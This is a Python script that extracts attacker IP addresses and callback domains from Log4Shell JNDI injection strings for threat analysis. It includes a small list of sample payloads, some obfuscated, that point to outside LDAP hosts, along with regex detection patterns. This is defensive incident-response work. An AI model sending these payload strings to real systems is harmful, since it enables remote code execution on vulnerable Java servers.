# -*- coding:utf-8 -*-
# -*- author:safest-place -*-
# -*- author:aero -*-
import re

log4jPayloads = [
    "${j${UBcEB:CuBuTh:-n}di:l${EXWnKF:aWObRc:PfYfk:YdGsUx:-d}${PrPvQa:eoTez:nLknmU:-a}p://1668768297396FsiCu.mcpirt.abc123.com/564476}",
    "\${jndi:ldap://1668768291776tcrNB.mcpirt.abc123.com/545728}",
    "\${jndi:ldap://222.18.242.221:8080/545728}",
    "t('${j${UBcEB:CuBuTh:-n}di:l${EXWnKF:aWObRc:PfYfk:YdGsUx:-d}${PrPvQa:eoTez:nLknmU:-a}p://1668768297396FsiCu.mcpirt.abc123.com/564476}')",
    "\${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://1668768303074IYmGt.mcpirt.abc123.com/743615}"
]

def log4jPayloadExtractIP(jndiStr):
    log4jPattern          = r'.*\$\{.*j.*n.*d.*i.*\}'
    normalPayloadPattern  = r'\$\{jndi\:.*\}'
    variantPayloadPattern = r'\$\{.*\$\{.*:-.*\}'
    ipaddrPattern         = r'((?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))'
    if re.findall(log4jPattern, jndiStr) == []:
        # Not a log4j payload return 0 string
        return ""
    else:
        if re.findall(normalPayloadPattern, jndiStr) != []:
            # normal log4j payload
            payload = re.findall(normalPayloadPattern, jndiStr)[0]
            if re.findall(ipaddrPattern, payload) != []:
                return re.findall(ipaddrPattern, payload)[0]
            else:
                return ""
        elif re.findall(variantPayloadPattern, jndiStr) != []:
            # variant log4j payload
            payload  = re.findall(variantPayloadPattern, jndiStr)[0]
            payload  = payload[2:-1]
            tmpStack = []
            for char in payload:
                if char == '}':
                    tmpChar = tmpStack.pop()
                    while tmpStack.pop() != '{':
                        pass
                    tmpStack.pop()              # Delete $
                    tmpStack.append(tmpChar)
                else:
                    tmpStack.append(char)
            tmpPayload = ''.join(tmpStack)
            if re.findall(ipaddrPattern, tmpPayload) != []:
                return re.findall(ipaddrPattern, tmpPayload)[0]
            else:
                return ""
        else:
            # unknow log4j payload
            return ""

def log4jPayloadExtractDomain(jndiStr):
    log4jPattern          = r'.*\$\{.*j.*n.*d.*i.*\}'
    normalPayloadPattern  = r'\$\{jndi\:.*\}'
    variantPayloadPattern = r'\$\{.*\$\{.*:-.*\}'
    iocPattern            = r'(?:jndi\:(?:ldap|rmi)\:\/\/)(.*)(?:\/.*)'
    if re.findall(log4jPattern, jndiStr) == []:
        # Not a log4j payload return 0 string
        return ""
    else:
        if re.findall(normalPayloadPattern, jndiStr) != []:
            # normal log4j payload
            payload = re.findall(normalPayloadPattern, jndiStr)[0]
            if re.findall(iocPattern, payload) != []:
                return re.findall(iocPattern, payload)[0]
        elif re.findall(variantPayloadPattern, jndiStr) != []:
            # variant log4j payload
            payload  = re.findall(variantPayloadPattern, jndiStr)[0]
            payload  = payload[2:-1]
            tmpStack = []
            for char in payload:
                if char == '}':
                    tmpChar = tmpStack.pop()
                    while tmpStack.pop() != '{':
                        pass
                    tmpStack.pop()
                    tmpStack.append(tmpChar)
                else:
                    tmpStack.append(char)
            tmpPayload = ''.join(tmpStack)
            if re.findall(iocPattern, tmpPayload) != []:
                return re.findall(iocPattern, tmpPayload)[0]
        else:
            # Not match log4j payload regluar
            return ""

for payload in log4jPayloads:
    print(log4jPayloadExtractIP(payload))
